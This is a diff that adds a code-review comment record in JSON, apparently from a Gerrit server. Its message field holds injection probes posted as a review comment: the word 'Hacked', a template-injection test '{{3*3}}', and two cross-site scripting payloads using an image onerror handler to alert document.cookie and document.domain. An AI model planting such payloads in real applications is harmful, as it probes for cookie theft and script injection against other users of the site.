@@ -1,0 +1,21 @@
+{
+  "comments": [
+    {
+      "unresolved": false,
+      "key": {
+        "uuid": "136fe644_765917e7",
+        "filename": "/PATCHSET_LEVEL",
+        "patchSetId": 2
+      },
+      "lineNbr": 0,
+      "author": {
+        "id": 1535177
+      },
+      "writtenOn": "2022-02-14T10:15:49Z",
+      "side": 1,
+      "message": "\nHacked\u003cbr\u003e\u003cbr\u003e\u003ccenter\u003e\u003cfont color\u003d\"red\"\u003e{{3*3}}\u003cbr\u003e\u003cbr\u003e\u003cimg src\u003dx onerror\u003dalert(document.cookie)\u003e\u003cbr\u003e\u003cbr\u003e\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e",
+      "revId": "ee465088c692e93cc2996b4f6600a901f5411af1",
+      "serverId": "3ce6091f-6c88-37e8-8c75-72f92ae8dfba"
+    }
+  ]
+}
